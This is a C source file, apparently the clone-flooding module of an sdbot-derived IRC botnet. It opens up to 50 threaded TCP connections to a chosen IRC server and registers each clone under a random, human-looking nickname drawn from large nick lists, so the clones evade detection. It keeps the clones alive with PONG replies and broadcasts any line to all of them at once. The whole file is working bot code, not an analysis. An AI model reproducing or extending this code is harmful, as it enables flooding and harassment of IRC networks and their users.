#include "includes.h"
#include "functions.h"
#include "externs.h"

#pragma warning(disable:4244)

SOCKET create_sock(char *host, int port)
{
	LPHOSTENT lpHostEntry = NULL;
	SOCKADDR_IN SockAddr;
	SOCKET sock;
	IN_ADDR iaddr;

	if ((sock = fsocket( AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
		return INVALID_SOCKET;

	memset(&SockAddr, 0, sizeof(SockAddr));
	SockAddr.sin_family = AF_INET;
	SockAddr.sin_port = fhtons((unsigned short)port);
	iaddr.s_addr = finet_addr(host);

	if (iaddr.s_addr == INADDR_NONE)
		lpHostEntry = fgethostbyname(host); //hostname
	if (lpHostEntry == NULL && iaddr.s_addr == INADDR_NONE)  //error dns
		return INVALID_SOCKET;
	if (lpHostEntry != NULL)
		SockAddr.sin_addr = *((LPIN_ADDR)*lpHostEntry->h_addr_list); //hostname
	else
		SockAddr.sin_addr = iaddr; //ip address
	if (fconnect(sock, (SOCKADDR *) &SockAddr, sizeof(SockAddr)) == SOCKET_ERROR) {
		fclosesocket(sock);
		return INVALID_SOCKET;
	}

	return sock;
}


 const char *nicklist1[] = {
	/* 1st bits of nick */
			"q",
			"w",
			"e",
			"r",
			"t",
			"y",
			"u",
			"i",
			"p",
			"a",
			"s",
			"d",
			"f",
			"g",
			"h",
			"j",
			"k",
			"l",
			"z",
			"x",
			"c",
			"v",
			"b",
			"n",
			"m",
			"Q",
			"W",
			"E",
			"R",
			"T",
			"Y",
			"U",
			"I",
			"O",
			"P",
			"A",
			"S",
			"D",
			"F",
			"G",
			"H",
			"J",
			"K",
			"L",
			"Z",
			"X",
			"C",
			"V",
			"B",
			"N",
			"M",
			"SMARTMIR",
			"farooq",
			"maxxguy",
			"BOBMARLEY",
			"emilya",
			"KRIZHA",
			"Car1nna",
			"swin",
			"male",
			"koko",
			"flexster",
			"ken",
			"Shez",
			"talika",
			"marcy",
			"cme",
			"heval",
			"bunty",
			"janno",
			"rimpy",
			"nastysha",
			"Luisa",
			"troller",
			"manee",
			"kermit",
			"puregold",
			"CoreDump",
			"imra",
			"GirL",
			"CAMEL",
			"reshma",
			"Kencing",
			"THR45H3R5",
			"cansuuuu",
			"kaan38dent",
			"erkan27",
			"hexaaa",
			"berk19",
			"OBeNiBiSeVSe",
			"irmal",
			"misssunday",
			"Tolga34",
			"JERICHO",
			"MARY",
			"AKIN",
			"melekk",
			"trend3",
			"M-E-R-V-E",
			"tekir",
			"venedik34",
			"sevmekmi",
			"SUDENUR",
			"ARZU",
			"haticem",
			"ERNESTO",
			"aslii",
			"PIRAMIT",
			"samyeli21",
			"RETG",
			"blackpearl",
			"pelincik",
			"ahmet",
			"turkyy",
			"ank32m",
			"ZACK",
			"Izmir39m",
			"albina",
			"AYLA-",
			"AtE",
			"ankh",
			"Donjuanm",
			"bogac",
			"alpay34m",
			"CoNGuERoR",
			"DenizliM",
			"Berk19m",
			"devran",
			"arda",
			"keyifliSERT",
			"murat34-m",
			"hakan3",
			"IMIRZALI--",
			"RAMTHA",
			"Emre--",
			"elmaazyok",
			"Esmerkiz",
			"kebikec",
			"FLoRD",
			"holy",
			"MAHINUR",
			"SaDIkaEllesme",
			"aykut1",
			"Kashmira",
			"SeViSeLi",
			"SUGARBOY-",
			"uzgun36",
			"kumul",
			"ADALIM",
			"umut-",
			"ANK-32-M",
			"DJSPACE",
			"Ankar",
			"FeNeRLee",
			"hayran",
			"angelgirl",
			"kapk",
			"Achilles",
			"TEGMEN",
			"kotan",
			"sevda",
			"ERK",
			"alcatras",
			"a44m",
			"birsen",
			"yabanc",
			"devre",
			"erkan",
			"ankM",
			"Adem28",
			"maxsilla",
			"M41IST",
			"AdAMM33",
			"firtina",
			"Ata29",
			"KORAY",
			"akden",
			"izmirlm",
			"ula",
			"NE-HABER",
			"passenger",
			"tropikal",
			"cool30m",
			"cem39",
			"RERPJJ",
			"TEOMAN```",
			"DALLAS43M",
			"prometheus",
			"MaVe{R}icK",
			"ADAMM",
			"cumhur29",
			"WANTEDLOVE",
 };

 const char *nicklist2[] = {
	"sex", "lez", "zex", "tree", "bad", "lag", "|tambe|", "|woh|", "-|tot|", "|suck|", "|luck|", "{hub}", "{sex}", "{gens|", "||luvu-f|", "|wiked|", "sick}}", "Q8", "|q8|"
	"a", "b", "c", "d", "e", "f", "g", "h", "i", "_", "j", "k", "l", "m", "n", "o", "p", "q", "r"
	"s", "t", "u", "v", "w", "x", "y", "z", "happy", "rg", "ty", "gf", "rt", "sdf", "ui", "luvy", "trimy", "truck", "muck"
	"c", "z", "g", "s", "q", "BRB", "|bbl", "", "", "_|_", "", "", "", "", "F", "M", "LUVU", "Sad", ""
	"^^^f^", "b", "", "Sleeping", "", "", "Fuck", "Free", "", "", "X", "", "BOY", "GIRL", "gurl", "shit", "aha", "yeah", "muha", "mof0", "mofo", "tot", "lol", "lolo"
	"|a|", "|sex4free|", "|4us|", "{4you}", "|4u|", "5u", "6u"
 };


 const int nickcnt1 = sizeof nicklist1 / sizeof nicklist1[0];
 const int nickcnt2 = sizeof nicklist2 / sizeof nicklist2[0];

clonestr clone_data[50];

void clone_send(char *buf)
{
	int c;
	strcat(buf,"\n");
	for(c=0;c<50;c++)
		if (clone_data[c].used == TRUE && clone_data[c].sock > 0) fsend(clone_data[c].sock,buf,strlen(buf),0);
}

int clone_read(char * line,SOCKET sock)
{

	char *s[8];
	char buf[512];
	char buf2[512];
	//DWORD id;
	int i;
	s[0] = strtok(line, " ");
	for (i = 1; i < 8; i++) s[i] = strtok(NULL, " ");

	if (!s[0] && !s[1]) return 1;
	if (strcmp("PING", s[0]) == 0) {
		sprintf(buf,"PONG %s\n",s[1]);
		fsend(sock, buf, strlen(buf), 0);
	}
	else if (strcmp("433",s[1]) == 0 || strcmp("432",s[1]) == 0) {
		memset(buf2,0,sizeof(buf2));
		clone_nick(buf2);
		sprintf(buf,"NICK %s\n",buf2);
		fsend(sock, buf, strlen(buf), 0);
	}
	return 0;
}

DWORD WINAPI connect_clone(LPVOID param)
{
	int c = (int)param;
	clone_data[c].used = TRUE;
	if ((clone_data[c].sock = create_sock(clone_data[c].server,clone_data[c].port)) < 1) 
	{ 
		goto end;
	}
	char buf[4096];
	char buf2[4096];
	char buf3[4096];
	char buffer[4096];
	DWORD er;
	memset(buf,0,sizeof(buf));
	clone_nick(buf);
	clone_nick(buf2);
	clone_nick(buf3);

	sprintf(buffer,"NICK %s\nUSER %s \"hotmail.com\" \"127.0.0.1\" :%s\n",buf,buf2,buf3);//sdbot uses \r\n thats why it doesnt connect to some servers
    fsend(clone_data[c].sock, buffer, strlen(buffer), 0);
	memset(buffer,0,sizeof(buffer));
	int t;
	int x;
	int len;
	while (1) {
		memset(buffer,0,sizeof(buffer));
		if ((len = frecv(clone_data[c].sock, buffer,sizeof(buffer), 0)) <= 0) 
		{
			break;
		}
		for (t=0;t!=len;t++)
		{
			if (buffer[t] == '\r' || buffer[t] == '\n' || x == 4000) 
			{
				if (x == 0) continue;
				buf[x] = '\0';
				er = clone_read(buf,clone_data[c].sock);
				if (er > 0) goto end;
				memset(buf,0,sizeof(buf));
				x=0;
			}
			else 
			{
				buf[x] = buffer[t];
				x++;
			}

		}
	}
	end:;
	clone_data[c].used = FALSE;
	if (clone_data[c].sock > 0) fclosesocket(clone_data[c].sock);
	//if (clone_data[c].Handle != NULL) CloseHandle(clone_data[c].Handle);
	return 0;
}


void load_clones(char * Clone_Server,int Clone_port,int num_clones) {

	int i,x;
	DWORD id;
	for (i=0;i<num_clones;i++)
	{
		for (x=0;x<50;x++)
			if (clone_data[x].used == FALSE) break;
		if (x == 49) break;
		strcpy(clone_data[x].server,Clone_Server);
		clone_data[x].port = Clone_port;
		clone_data[x].used = TRUE;
		CreateThread(NULL, 0, &connect_clone, (LPVOID)x, 0, &id);


	}
}



char * clone_nick(char *strbuf) {
    int n, il, rnd, rndn;
    char nick[20];
    char *t;
    char *spc = "-|`_\\{[]}";
    BOOL chgnick = FALSE;
    
    memset(nick, 0, sizeof nick);
    
    /* create the 1st bit of the nick */
    rnd = rand() / (RAND_MAX + 1.0) * 75;
    if(rnd == 1) {
        rnd = rand() / (RAND_MAX + 1.0) * nickcnt2;
        strcpy(nick, nicklist2[rand() % nickcnt2]);
    } else {
        rnd = rand() / (RAND_MAX + 1.0) * nickcnt1;
        strcpy(nick, nicklist1[rand() % nickcnt1]);
    }
    
    n = strlen(nick);
    il = sizeof nick - 1 - n;
    
    /* rules to decide whether or not we are going to add a 2nd bit to the nick */
    rnd = rand() / (RAND_MAX + 1.0) * 2;
    rndn = rand() / (RAND_MAX + 1.0) * n;
    if(n <= 2)
        chgnick = TRUE;
    else if(n == 3 && rnd == 1)
        chgnick = TRUE;
    else if(rndn == 1)
        chgnick = TRUE;
    
    /* add a second bit to the nick */
    if(chgnick) {
        char nbit[20];
        rnd = rand() / (RAND_MAX + 1.0) * nickcnt2;
        strcpy(nbit, nicklist2[rnd]);
        /* if the two bits of nick are not already separated by a char, randomly add one */
        if(!(t = strchr(spc, nick[n-1]))) {
            if(!(t = strchr(spc, nbit[0]))) {
                rndn = rand() / (RAND_MAX + 1.0) * (n - 1);
                if(rndn == 1) {
                    rnd = rand() / (RAND_MAX + 1.0) * strlen(spc);
                    nick[n] = spc[rnd];
                }
            }
        }
        strncat(nick, nbit, il);
    }
    
    n = strlen(nick);
    
    /* randomly add some stuff at the end of the nick */
    if(!isdigit(nick[n-1])) {
        il = 0;
        if(!(t = strchr(spc, nick[n-1]))) {
            rndn = rand() / (RAND_MAX + 1.0) * (n + 3);
            if(n == 3 || rndn == 1) {
                if(rndn % 2 == 1) {
                    rnd = rand() / (RAND_MAX + 1.0) * strlen(spc);
                    nick[n++] = spc[rnd];
                } else {
                    rnd = rand() / (RAND_MAX + 1.0) * 57;
                    nick[n++] = rnd + 65;
                }
                il++;
                rndn = rand() / (RAND_MAX + 1.0) * 5;
                if(n == 3 || rndn == 1) {
                    if(rndn % 2 == 0) {
                        rnd = rand() / (RAND_MAX + 1.0) * strlen(spc);
                        nick[n++] = spc[rnd];
                    } else {
                        rnd = rand() / (RAND_MAX + 1.0) * 57;
                        nick[n++] = rnd + 65;
                    }
                    il++;
                }
            }
        }
        
        if(n < 6) {
            if(n < 5) rnd = rand() / (RAND_MAX + 1.0) * 2;
            else rnd = rand() / (RAND_MAX + 1.0) * (8 - n);
            if(rnd == 0) {
                rnd = rand() / (RAND_MAX + 1.0) * 10;
                nick[n++] = rnd + 48;
            }
            else if(rnd == 1) {
                rnd = rand() / (RAND_MAX + 1.0) * 57;
                nick[n++] = rnd + 65;
            }
        }
        
        if(il < 2) {
            rndn = rand() / (RAND_MAX + 1.0) * n;
            if(rndn == 1) {
                rnd = rand() / (RAND_MAX + 1.0) * 10;
                nick[n++] = rnd + 48;
                rndn = rand() / (RAND_MAX + 1.0) * 10;
                if(rndn == 1 && il < 1) {
                    rnd = rand() / (RAND_MAX + 1.0) * 5;
                    nick[n++] = rnd + 48;
                }
            }
        }
    }
    
    strncpy(strbuf, nick, sizeof nick);
    return strbuf;
}


